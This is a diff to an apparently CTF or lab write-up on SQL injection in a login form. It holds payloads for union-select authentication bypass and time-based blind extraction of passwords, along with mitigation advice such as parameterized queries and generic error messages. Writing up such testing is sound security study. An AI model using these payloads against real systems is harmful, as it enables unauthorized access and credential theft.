@@ -57,9 +57,10 @@ III. Exploitation
     Other Avenues for exploiting VIA TIME BASED AND UNION SELECT:
     NOTE: Union Select will be used for another flag
     ~~~
-    Payload: ' OR (UNION SELECT NULL#) // This also doesn't give us an error but adding a second NULL value errors   
+    Payload1: ' OR (UNION SELECT NULL#) // This also doesn't give us an error but adding a second NULL value errors
+    Payload2: ' UNION SELECT 'abc' AS password FROM admins#
     
-    Payload: ' OR (SELECT CASE WHEN SUBSTRING(password,1,1)='k' THEN sleep(10) ELSE 1=2 END)# //induces sleep if 
+    Payload1: ' OR (SELECT CASE WHEN SUBSTRING(password,1,1)='k' THEN sleep(10) ELSE 1=2 END)# //induces sleep if 
     condition is true. This would be better if the default login creds message was standard
     ~~~
     
@@ -73,4 +74,5 @@ V. Conclusion/Mitigation
     For mitigation I would sanitize user input before passing it to the database and use parameterized queries. 
     I would also give a single generic message when trying to login like "unknown login credentials" instead of
     "Unknown Username" and "Invalid password". Even if SQLi wasn't present the ungeneric error messages would lead
-    to username enumeration.
+    to username enumeration. Additionally the JWT being used has admin:true as the body and that could be a potential
+    vulnerability. This has not been checked yet but would be in a real test
